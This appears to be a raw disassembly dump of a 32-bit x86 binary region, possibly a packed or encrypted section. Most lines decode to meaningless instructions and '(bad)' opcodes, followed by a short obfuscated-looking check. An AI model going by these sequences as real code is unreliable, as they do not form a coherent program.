  40fa55:	out    dx,al
  40fa56:	std    
  40fa57:	fsubr  st,st(0)
  40fa59:	rol    dl,cl
  40fa5b:	scas   al,BYTE PTR es:[edi]
  40fa5c:	into   
  40fa5d:	lods   al,BYTE PTR ds:[esi]
  40fa5e:	retf   0xede9
  40fa61:	int3   
  40fa62:	cli    
  40fa63:	cli    
  40fa64:	rcl    ecx,cl
  40fa66:	clc    
  40fa67:	into   
  40fa68:	fcmovbe st,st(0)
  40fa6a:	rol    DWORD PTR [eax],0xc4
  40fa6d:	les    eax,FWORD PTR [edi]
  40fa6f:	in     eax,0xc1
  40fa71:	add    ecx,DWORD PTR [edx]
  40fa73:	enter  0xc8fe,0xd3
  40fa77:	shl    edx,0xe8
  40fa7a:	mov    bh,0xb3
  40fa7c:	retf   
  40fa7d:	div    edx
  40fa7f:	mov    ah,0xdb
  40fa81:	(bad)  
  40fa83:	fidivr WORD PTR [edx-0x17fc2014]
  40fa89:	add    BYTE PTR [edi],al
  40fa8b:	loope  0x40fa54
  40fa8d:	fdivp  st(3),st
  40fa8f:	les    ecx,FWORD PTR [eax]
  40fa91:	add    ebp,esi
  40fa93:	or     eax,0xece5d9e9
  40fa98:	loopne 0x40fa85
  40fa9a:	(bad)  
  40fa9b:	out    0xcd,eax
  40fa9d:	out    0xcc,al
  40fa9f:	fxch   st(5)
  40faa1:	shl    esi,cl
  40faa3:	out    dx,al
  40faa4:	mov    esp,0xf6daf6d7
  40faa9:	(bad)  
  40faab:	stc    
  40faac:	fadd   DWORD PTR [edx]
  40faae:	cld    
  40faaf:	retf   
  40fab0:	or     bh,bl
  40fab2:	add    bh,ah
  40fab4:	in     eax,dx
  40fab5:	add    ebx,esi
  40fab7:	stos   DWORD PTR es:[edi],eax
  40fab8:	in     eax,dx
  40fab9:	retf   0xf2ca
  40fabc:	shr    dl,cl
  40fabe:	test   dh,0xc0
  40fac1:	lock int3 
  40fac3:	out    dx,al
  40fac4:	cld    
  40fac5:	sar    bh,cl
  40fac7:	int3   
  40fac8:	pop    es
  40fac9:	(bad)  
  40faca:	xlat   BYTE PTR ds:[ebx]
  40facb:	mov    edi,0xc5d9f3db
  40fad0:	std    
  40fad1:	jecxz  0x40faa1
  40fad3:	in     al,dx
  40fad4:	aam    0xed
  40fad6:	(bad)  
  40fad7:	shl    BYTE PTR [edx-0x3e3a3e14],cl
  40fadd:	retf   0xd8b5
  40fae0:	(bad)  
  40fae1:	stc    
  40fae2:	mov    dh,0xba
  40fae4:	mov    edi,0xc0febbdf
  40fae9:	in     al,dx
  40faea:	loopne 0x40fae7
  40faec:	in     eax,0x1
  40faee:	jmp    0xecf5:0xefd6fd05
  40faf5:	add    al,0xc0
  40faf7:	out    dx,al
  40faf8:	leave  
  40faf9:	test   dl,0xef
  40fafc:	ret    0xe4d0
  40faff:	mul    edi
  40fb01:	retf   
  40fb02:	in     al,dx
  40fb03:	retf   
  40fb04:	fcomip st,st(6)
  40fb06:	sar    esi,cl
  40fb08:	out    0xe3,eax
  40fb0a:	pop    es
  40fb0b:	(bad)  
  40fb0c:	fld    QWORD PTR [edi]
  40fb0e:	mov    esp,0xde4c9f5
  40fb13:	in     eax,0xf3
  40fb15:	or     ah,al
  40fb17:	call   0xd618c5fd
  40fb1c:	in     eax,dx
  40fb1d:	shl    esp,1
  40fb1f:	into   
  40fb20:	fbstp  TBYTE PTR [esi-0x430c1248]
  40fb26:	icebp  
  40fb27:	fdiv   st,st(3)
  40fb29:	ret    
  40fb2a:	int    0xbb
  40fb2c:	cmc    
  40fb2d:	cld    
  40fb2e:	lock leave 
  40fb30:	rol    BYTE PTR [eax],1
  40fb32:	push   es
  40fb33:	or     ch,cl
  40fb35:	retf   0xc3ff
  40fb38:	jmp    0x40fb10
  40fb3a:	shr    esi,0xc1
  40fb3d:	loopne 0x40fb06
  40fb3f:	shl    bl,cl
  40fb41:	fdivrp st(2),st
  40fb43:	mov    edi,0xf4e8b8bd
  40fb48:	(bad)  
  40fb49:	cld    
  40fb4a:	in     eax,0xec
  40fb4c:	sti    
  40fb4d:	sar    DWORD PTR [ecx+eiz*8+0xae0e2c8],0xed
  40fb55:	in     eax,0xef
  40fb57:	into   
  40fb58:	shr    BYTE PTR [ebp-0x2f293e0e],1
  40fb5e:	iret   
  40fb5f:	jmp    0x40fb16
  40fb61:	(bad)  
  40fb62:	sar    BYTE PTR [eax-0x264a],1
  40fb68:	(bad)  
  40fb6a:	fiadd  WORD PTR [edi]
  40fb6c:	ret    0xf4f3
  40fb6f:	fcmovbe st,st(5)
  40fb71:	out    dx,al
  40fb72:	(bad)  
  40fb74:	lds    eax,FWORD PTR [edx]
  40fb76:	add    eax,esp
  40fb78:	fild   QWORD PTR [eax-0x44c2d42]
  40fb7e:	enter  0xc0ee,0xcc
  40fb82:	jmp    0x40fb80
  40fb84:	jmp    0x81dfe54
  40fb89:	sti    
  40fb8a:	sar    DWORD PTR [ebx-0x213cfbfe],cl
  40fb90:	fcmovnu st,st(2)
  40fb92:	fchs   
  40fb94:	enter  0xace,0xcc
  40fb98:	scas   al,BYTE PTR es:[edi]
  40fb99:	out    0xd2,eax
  40fb9b:	(bad)  
  40fb9c:	mov    dl,0xb5
  40fb9e:	cli    
  40fb9f:	out    0xda,al
  40fba1:	(bad)  
  40fba2:	iret   
  40fba3:	mov    ch,0xf0
  40fba5:	fld1   
  40fba7:	(bad)  
  40fba9:	xlat   BYTE PTR ds:[ebx]
  40fbaa:	ret    
  40fbab:	in     eax,dx
  40fbac:	out    0xf0,eax
  40fbae:	cmc    
  40fbaf:	stc    
  40fbb0:	add    al,BYTE PTR [ebx]
  40fbb2:	fdivp  st(7),st
  40fbb4:	fadd   st(4),st
  40fbb6:	inc    esi
  40fbb8:	scas   eax,DWORD PTR es:[edi]
  40fbb9:	mov    edi,0xcaf6eaac
  40fbbe:	sti    
  40fbbf:	enter  0xd8c4,0xe4
  40fbc3:	enter  0xcaf8,0xf6
  40fbc7:	(bad)  
  40fbc8:	fucomip st,st(5)
  40fbca:	ret    
  40fbcb:	mov    ebx,0xfefad0c2
  40fbd0:	inc    ebp
  40fbd2:	fmul   st,st(0)
  40fbd4:	loop   0x40fbc5
  40fbd6:	cli    
  40fbd7:	ror    eax,cl
  40fbd9:	call   0xcf0ebcd5
  40fbde:	jmp    0xb9e8:0xf6e9dff3
  40fbe5:	std    
  40fbe6:	hlt    
  40fbe7:	ret    0xbced
  40fbea:	int3   
  40fbeb:	(bad)  
  40fbed:	jecxz  0x40fbca
  40fbef:	rol    DWORD PTR [esi],1
  40fbf1:	fsubr  st(5),st
  40fbf3:	add    al,0xe1
  40fbf5:	clc    
  40fbf6:	in     eax,0xbe
  40fbf8:	fild   QWORD PTR [esi-0x14551244]
  40fbfe:	mov    ah,0xeb
  40fc00:	int3   
  40fc01:	cmc    
  40fc02:	(bad)
  40fc05:	in     eax,dx
  40fc06:	fstp   st(0)
  40fc08:	mul    bh
  40fc0a:	add    DWORD PTR [edx],eax
  40fc0c:	sar    edx,cl
  40fc0e:	add    al,0xdf
  40fc10:	add    BYTE PTR [edi],al
  40fc12:	shl    dl,0xcd
  40fc15:	loope  0x40fbdf
  40fc17:	(bad)  
  40fc18:	loopne 0x40fbe4
  40fc1a:	shl    ebx,cl
  40fc1c:	sti    
  40fc1d:	ror    ch,1
  40fc1f:	mov    bl,0xd5
  40fc21:	hlt    
  40fc22:	cmc    
  40fc23:	mov    ebx,0xf9cecbb5
  40fc28:	call   0xd721f928
  40fc2d:	(bad)  
  40fc2e:	hlt    
  40fc2f:	jmp    0xe401e109
  40fc34:	push   es
  40fc35:	fisttp WORD PTR ds:0xcde9efef
  40fc3b:	mov    cl,0xc0
  40fc3d:	test   eax,0xccc4d1ba
  40fc42:	rcl    ch,cl
  40fc44:	imul   ch
  40fc46:	retf   0x7f6
  40fc49:	mov    ebp,0xe7f7c703
  40fc4e:	add    ebp,edi
  40fc50:	pop    es
  40fc51:	loope  0x40fc3d
  40fc53:	clc    
  40fc54:	std    
  40fc55:	out    dx,al
  40fc56:	add    eax,0xaecee8ae
  40fc5b:	shl    BYTE PTR [ecx-0x334b440c],cl
  40fc61:	repnz push esi
  40fc64:	enter  0xc9cc,0xc8
  40fc68:	sti    
  40fc69:	fdivp  st(7),st
  40fc6b:	push   es
  40fc6c:	mov    edx,0xabfd1f8
  40fc71:	out    0x7,eax
  40fc73:	int    0xc8
  40fc75:	push   es
  40fc76:	loopne 0x40fc1f
  40fc78:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fc79:	repnz iret 
  40fc7b:	mov    esp,0xe6e1fbf6
  40fc80:	lock jmp 0xb531b450
  40fc86:	clc    
  40fc87:	call   0xd523c47e
  40fc8c:	jmp    0x40fc83
  40fc8e:	cld    
  40fc8f:	aad    0xc0
  40fc91:	(bad)  
  40fc93:	(bad)  
  40fc94:	in     eax,dx
  40fc95:	(bad)  
  40fc97:	leave  
  40fc98:	ffreep st(2)
  40fc9a:	int3   
  40fc9b:	mov    cl,0xb1
  40fc9d:	fcmovnu st,st(3)
  40fc9f:	cmc    
  40fca0:	in     al,0xfa
  40fca2:	fcmovnu st,st(4)
  40fca4:	call   0xd0f9c6a1
  40fca9:	fnclex 
  40fcab:	in     eax,dx
  40fcac:	loop   0x40fc9f
  40fcae:	(bad)  
  40fcb0:	add    eax,0x6ed0e02
  40fcb5:	or     ecx,esp
  40fcb7:	in     al,dx
  40fcb8:	test   al,0xbe
  40fcba:	ror    bh,0xc6
  40fcbd:	in     al,dx
  40fcbe:	enter  0xd5c6,0xd3
  40fcc2:	mov    edi,0xccbdf8fb
  40fcc7:	clc    
  40fcc8:	ror    bh,cl
  40fcca:	in     eax,dx
  40fccb:	add    DWORD PTR [ebx+esi*8],eax
  40fcce:	inc    BYTE PTR [edx]
  40fcd0:	add    al,0xe2
  40fcd2:	or     eax,0xe6e6ce0c
  40fcd7:	ror    esp,1
  40fcd9:	enter  0xafc6,0xe2
  40fcdd:	xlat   BYTE PTR ds:[ebx]
  40fcde:	ret    0xd9f7
  40fce1:	retf   0xf7dd
  40fce4:	out    dx,eax
  40fce5:	ret    
  40fce6:	cmc    
  40fce7:	hlt    
  40fce8:	cld    
  40fce9:	(bad)  
  40fceb:	add    esi,ecx
  40fced:	fimul  DWORD PTR [ecx]
  40fcef:	shr    cl,1
  40fcf1:	retf   0xdffb
  40fcf4:	pand   mm1,mm2
  40fcf7:	rol    dh,1
  40fcf9:	ror    ebp,1
  40fcfb:	mov    dh,0xdb
  40fcfd:	shl    BYTE PTR [eax-0xa240e40],1
  40fd03:	retf   0xf0be
  40fd06:	stc    
  40fd07:	add    cl,dl
  40fd09:	int    0xce
  40fd0b:	repz add ecx,edx
  40fd0e:	repnz stc 
  40fd10:	add    eax,0xef8c50f
  40fd15:	in     eax,0xee
  40fd17:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fd18:	out    dx,al
  40fd19:	xlat   BYTE PTR ds:[ebx]
  40fd1a:	mov    esp,0xfac2b7ed
  40fd1f:	les    esi,FWORD PTR [ebp-0x27320449]
  40fd25:	lock mov eax,0xe1dce2c8
  40fd2b:	sar    BYTE PTR [ebp-0x2704341f],0xc7
  40fd32:	(bad)  
  40fd33:	int    0xe6
  40fd35:	or     al,0xe8
  40fd37:	scas   eax,DWORD PTR es:[edi]
  40fd38:	test   eax,0xe9e2bceb
  40fd3d:	jmp    0xd2ed:0xe4d9daf2
  40fd44:	repz mov ecx,0xf1f2c3f4
  40fd4a:	(bad)  
  40fd4b:	in     al,dx
  40fd4c:	rol    BYTE PTR [ecx],0xc2
  40fd4f:	add    ah,ah
  40fd51:	cld    
  40fd52:	in     eax,0xfd
  40fd54:	retf   0xfcc9
  40fd57:	mov    esi,0xb5b7c6f0
  40fd5c:	mov    cl,0xd3
  40fd5e:	int    0xf3
  40fd60:	leave  
  40fd61:	not    esp
  40fd63:	call   0xdefdc644
  40fd68:	hlt    
  40fd69:	ret    0xfec7
  40fd6c:	in     eax,0xc2
  40fd6e:	ret    
  40fd6f:	jmp    0xe320c77d
  40fd74:	add    edx,DWORD PTR [edx]
  40fd76:	stc    
  40fd77:	in     al,dx
  40fd78:	mov    esi,0xb2ebf5f7
  40fd7d:	call   0xcdfab27d
  40fd82:	fidivr WORD PTR [eax-0x1c25402d]
  40fd88:	in     al,dx
  40fd89:	hlt    
  40fd8a:	sti    
  40fd8b:	int    0xdc
  40fd8d:	mov    esp,0xc006f7e0
  40fd92:	(bad)  
  40fd93:	push   cs
  40fd94:	inc    ch
  40fd96:	por    mm3,mm4
  40fd99:	jmp    0xc5db:0xdab4b3f1
  40fda0:	mov    eax,0xc9b4c4b7
  40fda5:	enter  0xd4f2,0xe2
  40fda9:	mov    edi,0xcbfde6f2
  40fdae:	jmp    0x905:0xeb00fdc2
  40fdb5:	ror    eax,cl
  40fdb7:	ffreep st(5)
  40fdb9:	into   
  40fdba:	retf   
  40fdbb:	repz mov bh,0xd5
  40fdbe:	iret   
  40fdbf:	mov    ch,0xb8
  40fdc1:	fdivp  st(3),st
  40fdc3:	cld    
  40fdc4:	in     eax,dx
  40fdc5:	out    dx,al
  40fdc6:	aad    0xe8
  40fdc8:	in     eax,dx
  40fdc9:	icebp  
  40fdca:	fcmovbe st,st(4)
  40fdcc:	rcl    edi,1
  40fdce:	retf   
  40fdcf:	hlt    
  40fdd0:	or     dh,bh
  40fdd2:	jecxz  0x40fd99
  40fdd4:	enter  0xcf05,0xe8
  40fdd8:	into   
  40fdd9:	(bad)  
  40fdda:	imul   BYTE PTR [ebx-0x45040c18]
  40fde0:	(bad)  
  40fde1:	leave  
  40fde2:	dec    ah
  40fde4:	in     eax,dx
  40fde5:	mov    cl,0xe8
  40fde7:	aad    0xce
  40fde9:	std    
  40fdea:	pop    es
  40fdeb:	cld    
  40fdec:	loope  0x40fdc3
  40fdee:	ret    
  40fdef:	add    eax,0xb0fc9d4
  40fdf4:	in     eax,0xfc
  40fdf6:	or     edi,DWORD PTR [ecx-0x1e1e3a30]
  40fdfc:	ret    
  40fdfd:	lock cmc 
  40fdff:	in     al,dx
  40fe00:	shl    al,1
  40fe02:	int3   
  40fe03:	mov    ebx,0xd2e2cbcf
  40fe08:	(bad)  
  40fe0a:	add    eax,ebx
  40fe0c:	add    dl,ch
  40fe0e:	retf   0xc50b
  40fe11:	add    dh,ah
  40fe13:	hlt    
  40fe14:	or     bl,dh
  40fe16:	fdiv   st,st(3)
  40fe18:	rep lods eax,DWORD PTR ds:[esi]
  40fe1a:	lock int 0xcd
  40fe1d:	jecxz  0x40fdcf
  40fe1f:	sti    
  40fe20:	scas   al,BYTE PTR es:[edi]
  40fe21:	mov    eax,0xdaddd5e4
  40fe26:	(bad)  
  40fe27:	aad    0xce
  40fe29:	aad    0xf1
  40fe2b:	loope  0x40fe0d
  40fe2d:	shr    edx,cl
  40fe2f:	loope  0x40fe0a
  40fe31:	iret   
  40fe32:	fdiv   st,st(5)
  40fe34:	(bad)  
  40fe36:	fmul   st(0),st
  40fe38:	iret   
  40fe39:	lock test al,0xe8
  40fe3c:	jmp    0x40fe1e
  40fe3e:	sti    
  40fe3f:	repz into 
  40fe41:	int3   
  40fe42:	mov    esi,0xf7f6dede
  40fe47:	rcr    esi,0xbd
  40fe4a:	jmp    eax
  40fe4c:	ret    0xac7
  40fe4f:	add    eax,0xddfdc403
  40fe54:	clc    
  40fe55:	out    dx,eax
  40fe56:	push   es
  40fe57:	out    0xd2,eax
  40fe59:	out    dx,eax
  40fe5a:	in     al,dx
  40fe5b:	ret    
  40fe5c:	retf   0xf5fb
  40fe5f:	fcmove st,st(3)
  40fe61:	lods   eax,DWORD PTR ds:[esi]
  40fe62:	repz in eax,0xbf
  40fe65:	cmc    
  40fe66:	into   
  40fe67:	mov    ebp,0xfd00eed5
  40fe6c:	lock fcom st(5)
  40fe6f:	or     eax,edi
  40fe71:	loope  0x40fe58
  40fe73:	add    al,0xc4
  40fe75:	out    0xe4,al
  40fe77:	ret    0xd0c5
  40fe7a:	mov    dl,0xeb
  40fe7c:	jmp    0x40fe4f
  40fe7e:	mov    ah,0xc4
  40fe80:	(bad)  
  40fe81:	in     eax,dx
  40fe82:	mov    ecx,0xd5d4b8f2
  40fe87:	(bad)  
  40fe88:	(bad)  
  40fe89:	(bad)  
  40fe8b:	fidivr WORD PTR [ebp-0x3e252f00]
  40fe91:	xlat   BYTE PTR ds:[ebx]
  40fe92:	(bad)  
  40fe94:	(bad)  
  40fe95:	(bad)  
  40fe97:	lods   al,BYTE PTR ds:[esi]
  40fe98:	in     eax,0xae
  40fe9a:	xlat   BYTE PTR ds:[ebx]
  40fe9b:	jmp    0xc828ba6d
  40fea0:	mov    edx,0xdfd3b9b8
  40fea5:	repz loope 0x40fe7d
  40fea8:	stc    
  40fea9:	fsubp  st(6),st
  40feab:	repz in al,0xfe
  40feae:	pop    es
  40feaf:	loop   0x40fea7
  40feb1:	in     al,0xda
  40feb3:	out    0xdb,eax
  40feb5:	or     ch,ch
  40feb7:	test   al,0xe1
  40feb9:	jmp    0xf20daa6f
  40febe:	aad    0xcc
  40fec0:	jmp    0xd103:0xd5ccb5ce
  40fec7:	fst    st(7)
  40fec9:	pop    es
  40feca:	fstp   TBYTE PTR [ebp+0x3d5c6e0]
  40fed0:	out    0xc8,al
  40fed2:	cmc    
  40fed3:	sti    
  40fed4:	std    
  40fed5:	add    esp,ecx
  40fed7:	jmp    0x40fe97
  40fed9:	scas   al,BYTE PTR es:[edi]
  40feda:	fdivr  QWORD PTR [esi+ecx*8-0x1b133009]
  40fee1:	sti    
  40fee2:	aam    0xd5
  40fee4:	lock mov ebp,0xf5f6dad3
  40feea:	rcl    ebp,1
  40feec:	sti    
  40feed:	cli    
  40feee:	icebp  
  40feef:	out    0xe0,eax
  40fef1:	stc    
  40fef2:	fild   DWORD PTR ds:0xa8e5fcda
  40fef8:	icebp  
  40fef9:	lock mov cl,0xac
  40fefc:	mov    bh,0xfa
  40fefe:	(bad)  
  40ff00:	fldl2t 
  40ff02:	in     al,dx
  40ff03:	ror    esp,1
  40ff05:	mov    eax,0xf1bfcffb
  40ff0a:	rol    bl,cl
  40ff0c:	jecxz  0x40fed1
  40ff0e:	out    0xc7,eax
  40ff10:	(bad)  
  40ff11:	fucomi st,st(0)
  40ff13:	(bad)  
  40ff14:	inc    ch
  40ff16:	out    dx,eax
  40ff17:	in     eax,dx
  40ff18:	retf   0xc0f2
  40ff1b:	rol    bh,0xb7
  40ff1e:	out    0xe1,al
  40ff20:	lds    esi,FWORD PTR [edi-0x28470941]
  40ff26:	rcl    al,cl
  40ff28:	std    
  40ff29:	rol    esi,cl
  40ff2b:	fdivr  st(2),st
  40ff2d:	add    eax,0xc60406dd
  40ff32:	iret   
  40ff33:	int    0xc6
  40ff35:	bswap  esi
  40ff37:	repnz icebp 
  40ff39:	lods   al,BYTE PTR ds:[esi]
  40ff3a:	jmp    0xe6d4:0xeacfcfad
  40ff41:	leave  
  40ff42:	lods   al,BYTE PTR ds:[esi]
  40ff43:	retf   
  40ff44:	clc    
  40ff45:	std    
  40ff46:	rcr    cl,cl
  40ff48:	loope  0x40ff17
  40ff4a:	add    eax,0xfcf8f0e1
  40ff4f:	add    cl,bl
  40ff51:	(bad)  
  40ff52:	add    esp,ebx
  40ff54:	iret   
  40ff55:	add    ebx,ecx
  40ff57:	lock in eax,0xe1
  40ff5a:	into   
  40ff5b:	enter  0xc3c4,0xc8
  40ff5f:	mov    bh,0xec
  40ff61:	imul   bh
  40ff63:	fcom   st(6)
  40ff65:	cmc    
  40ff66:	aad    0xed
  40ff68:	clc    
  40ff69:	loope  0x40ff4c
  40ff6b:	add    dh,dl
  40ff6d:	sar    ch,cl
  40ff6f:	jecxz  0x40ff6b
  40ff71:	rcl    ebp,0xe2
  40ff74:	fisttp QWORD PTR [ecx]
  40ff76:	or     al,0xed
  40ff78:	retf   
  40ff79:	test   eax,0xb3b2c7e9
  40ff7e:	mov    al,0xeb
  40ff80:	retf   0xfdf5
  40ff83:	mov    ecx,0xbdc3fede
  40ff88:	mov    ecx,0xbaf9c3dd
  40ff8d:	les    ecx,FWORD PTR [edx]
  40ff8f:	xbegin 0x143ae08d
  40ff95:	in     eax,dx
  40ff96:	pop    es
  40ff97:	ret    
  40ff98:	in     al,0xe5
  40ff9a:	(bad)
  40ff9d:	retf   0xd3ee
  40ffa0:	mov    bh,0xb8
  40ffa2:	fnstcw WORD PTR [ebp+0x3fac8d8]
  40ffa8:	neg    ebp
  40ffaa:	fld    st(0)
  40ffac:	cli    
  40ffad:	div    ecx
  40ffaf:	fisttp DWORD PTR [eax]
  40ffb1:	std    
  40ffb2:	sar    dh,0xde
  40ffb5:	jmp    0xd0e7:0xebc7e3d2
  40ffbc:	mov    bh,0xb5
  40ffbe:	leave  
  40ffbf:	loopne 0x40ff71
  40ffc1:	int    0xba
  40ffc3:	in     eax,0xf5
  40ffc5:	mov    esi,0xf1d4bcc2
  40ffca:	repz aad 0xe3
  40ffcd:	rol    BYTE PTR [ebx],0xdd
  40ffd0:	fld    DWORD PTR [edx]
  40ffd2:	out    0xde,eax
  40ffd4:	repz sti 
  40ffd6:	in     eax,0xdd
  40ffd8:	jmp    0xb2e8:0xd0ede9f3
  40ffdf:	in     al,dx
  40ffe0:	mov    al,0xca
  40ffe2:	out    dx,al
  40ffe3:	fucomi st,st(6)
  40ffe5:	(bad)  
  40ffe7:	fdiv   st,st(0)
  40ffe9:	mov    esp,0x2f1fdc1
  40ffee:	sti    
  40ffef:	loopne 0x40ffd6
  40fff1:	add    al,0xee
  40fff3:	enter  0xcc05,0xd8
  40fff7:	repz (bad) 
  40fff9:	mov    esi,0xe3e8d0ad
  40fffe:	mov    ah,0xed
  410000:	out    dx,al
  410001:	rcr    eax,1
  410003:	mov    edx,0xece9d2d1
  410008:	sar    edx,0xd8
  41000b:	aad    0xf7
  41000d:	mov    ecx,0xf5f9c2c6
  410012:	std    
  410013:	cld    
  410014:	add    eax,0xc9c609dd
  410019:	loopne 0x410007
  41001b:	repnz stos BYTE PTR es:[edi],al
  41001d:	int    0xf2
  41001f:	fldl2e 
  410021:	mov    ebx,0xf9eab7ea
  410026:	aad    0xf2
  410028:	icebp  
  410029:	(bad)  
  41002b:	add    bh,ah
  41002d:	mov    ebp,0xddfce1c2
  410032:	or     BYTE PTR [eax],al
  410034:	cld    
  410035:	call   0xf02fe218
  41003a:	rcl    al,cl
  41003c:	int3   
  41003d:	fcomi  st,st(7)
  41003f:	aam    0xe5
  410041:	rcl    esp,cl
  410043:	xlat   BYTE PTR ds:[ebx]
  410044:	shl    edx,cl
  410046:	out    dx,al
  410047:	mov    esp,0xecfceef6
  41004c:	add    eax,0xf0f7e9cb
  410051:	out    0xd5,al
  410053:	jecxz  0x410032
  410055:	shr    eax,cl
  410057:	lock lock shr ecx,cl
  41005b:	enter  0xc1cd,0xcf
  41005f:	mov    ah,0xb9
  410061:	in     eax,dx
  410062:	shl    DWORD PTR [esi-0x62e0f12],cl
  410068:	in     eax,dx
  410069:	in     eax,dx
  41006a:	rcr    cl,1
  41006c:	clc    
  41006d:	shr    edx,0xf7
  410070:	or     edi,ebx
  410072:	fsubr  st,st(3)
  410074:	hlt    
  410075:	int    0xce
  410077:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410078:	jmp    0xd4d3:0xf5c8e5bd
  41007f:	int3   
  410080:	cli    
  410081:	jmp    0x410069
  410083:	mov    bl,0xbf
  410085:	retf   0xfbf1
  410088:	rcr    ecx,1
  41008a:	cmc    
  41008b:	add    edi,edx
  41008d:	mov    esp,0xbc5f8b8
  410092:	out    dx,al
  410093:	add    al,0xc8
  410095:	fmul   st(0),st
  410097:	stos   DWORD PTR es:[edi],eax
  410098:	in     eax,0xcd
  41009a:	out    0xf6,al
  41009c:	out    dx,eax
  41009d:	jmp    0x41008c
  41009f:	clc    
  4100a0:	out    0xce,eax
  4100a2:	aam    0xef
  4100a4:	clc    
  4100a5:	fdivr  st(6),st
  4100a7:	mov    ebx,0xf2e3c7bc
  4100ac:	(bad)  
  4100ad:	jmp    0x4100ab
  4100af:	test   BYTE PTR [edi+ecx*8],0xfc
  4100b3:	push   cs
  4100b4:	cli    
  4100b5:	out    dx,eax
  4100b6:	or     al,0xc4
  4100b8:	shl    DWORD PTR [ecx-0x2d160b54],cl
  4100be:	neg    bl
  4100c0:	iret   
  4100c1:	aam    0xea
  4100c3:	fst    st(4)
  4100c5:	fadd   DWORD PTR [ecx]
  4100c7:	out    dx,eax
  4100c8:	std    
  4100c9:	out    0xcd,eax
  4100cb:	stc    
  4100cc:	add    al,ch
  4100ce:	cld    
  4100cf:	lds    ecx,FWORD PTR [ecx]
  4100d1:	std    
  4100d2:	loopne 0x4100d4
  4100d4:	fdivp  st(6),st
  4100d6:	shr    DWORD PTR [ebx-0x36173916],cl
  4100dc:	ror    esi,0xef
  4100df:	(bad)  
  4100e0:	(bad)  
  4100e1:	jmp    0xf329c9d2
  4100e6:	xlat   BYTE PTR ds:[ebx]
  4100e7:	aam    0xd7
  4100e9:	clc    
  4100ea:	(bad)  
  4100eb:	fstp   st(3)
  4100ed:	xlat   BYTE PTR ds:[ebx]
  4100ee:	inc    DWORD PTR [esi]
  4100f0:	test   BYTE PTR [eax],0xe8
  4100f3:	jmp    0xcd05c2d1
  4100f8:	leave  
  4100f9:	rol    cl,0xf7
  4100fc:	fdiv   st(2),st
  4100fe:	imul   edx
  410100:	imul   ebx
  410102:	std    
  410103:	jmp    0xf70bd002
  410108:	mov    esp,0xe6f6e5f9
  41010d:	out    0xc3,eax
  41010f:	mov    DWORD PTR ds:0x13c809c4,0xf7f3c8db
  410119:	(bad)  
  41011a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41011b:	mov    bl,0xc1
  41011d:	lds    edi,FWORD PTR [ebx-0x402c291b]
  410123:	jmp    0xdd00:0xd101f6dd
  41012a:	lock cmc 
  41012c:	(bad)  
  41012d:	aad    0xcb
  41012f:	add    al,0x4
  410131:	loope  0x410110
  410133:	fmulp  st(3),st
  410135:	(bad)  
  410136:	out    dx,al
  410137:	test   eax,0xbdbeb1e4
  41013c:	mov    esp,0xd3f1d6b5
  410141:	in     al,0xcd
  410143:	xlat   BYTE PTR ds:[ebx]
  410144:	mov    eax,0xf4e1c8e3
  410149:	(bad)  
  41014a:	out    0xe0,eax
  41014c:	jecxz  0x410132
  41014e:	jmp    0xe30a:0xc4fa01fb
  410155:	add    eax,0xc4efc4fc
  41015a:	in     eax,dx
  41015b:	int3   
  41015c:	ret    
  41015d:	leave  
  41015e:	mov    al,0xce
  410160:	mov    edx,0xccf5f9db
  410165:	enter  0xf2f7,0xd4
  410169:	rol    cl,1
  41016b:	add    al,0xb
  41016d:	pop    es
  41016e:	retf   
  41016f:	add    dl,ah
  410171:	retf   
  410172:	(bad)  
  410173:	fsubr  st(5),st
  410175:	fucomip st,st(1)
  410177:	sar    DWORD PTR [eax-0x9541d52],cl
  41017d:	in     al,0xf9
  41017f:	leave  
  410180:	int    0xdf
  410182:	vpsrlw xmm7,xmm1,xmm6
  410186:	aad    0xb9
  410188:	inc    DWORD PTR [edi]
  41018a:	(bad)  
  41018c:	sti    
  41018d:	shl    edi,1
  41018f:	pop    es
  410190:	(bad)  
  410191:	fxch   st(1)
  410193:	add    ah,dl
  410195:	in     eax,dx
  410196:	add    eax,0xaeeeeadc
  41019b:	int3   
  41019c:	mov    ch,0xc0
  41019e:	icebp  
  41019f:	repnz int3 
  4101a1:	(bad)  
  4101a3:	int    0xd4
  4101a5:	cld    
  4101a6:	int    0xf2
  4101a8:	neg    dl
  4101aa:	add    esi,eax
  4101ac:	add    eax,0x606f2e1
  4101b1:	or     bl,bh
  4101b3:	cmc    
  4101b4:	fisttp DWORD PTR [edi]
  4101b6:	shl    DWORD PTR [edx-0x153d5a5a],cl
  4101bc:	mov    ah,0xc3
  4101be:	retf   
  4101bf:	les    edi,FWORD PTR [edx-0x15264737]
  4101c5:	repnz xlat BYTE PTR ds:[ebx]
  4101c7:	mul    ebx
  4101c9:	fidivr DWORD PTR [edi-0x71b2d1f]
  4101cf:	icebp  
  4101d0:	in     al,0x7
  4101d2:	inc    BYTE PTR [ebx]
  4101d4:	vpsubd xmm1,xmm2,xmm5
  4101d8:	(bad)
  4101db:	jmp    0xee17caa1
  4101e0:	mov    dh,0xef
  4101e2:	retf   
  4101e3:	(bad)  
  4101e5:	fcomi  st,st(1)
  4101e7:	(bad)  
  4101e9:	mov    ch,0xf8
  4101eb:	rol    DWORD PTR [ebx],0xc2
  4101ee:	mov    esp,0xe5e2dfd8
  4101f3:	in     eax,0xdc
  4101f5:	cli    
  4101f6:	retf   0xa6de
  4101f9:	scas   al,BYTE PTR es:[edi]
  4101fa:	iret   
  4101fb:	ret    
  4101fc:	(bad)  
  4101fd:	in     al,0xcb
  4101ff:	shl    DWORD PTR [eax-0x29104632],1
  410205:	ret    
  410206:	aam    0xd2
  410208:	mov    dh,0xf5
  41020a:	hlt    
  41020b:	jecxz  0x4101cf
  41020d:	rcr    dl,1
  41020f:	add    eax,DWORD PTR [ebx]
  410211:	(bad)  
  410212:	stc    
  410213:	fcmovnbe st,st(4)
  410215:	add    ebp,esp
  410217:	test   eax,0x89811403
  41021c:	push   ebp
  41021d:	lock mov eax,DWORD PTR [ebp-0x3c]
  410221:	xor    eax,0x75108b5
  410226:	add    eax,0x3272fb
  41022b:	cmp    DWORD PTR [ebp-0x10],eax
  41022e:	je     0x41023e
  410234:	jmp    0x412644
  410239:	jmp    0x412644
  41023e:	mov    eax,DWORD PTR [ebp-0x2c]
  410241:	mov    ecx,DWORD PTR [ebp-0x3c]
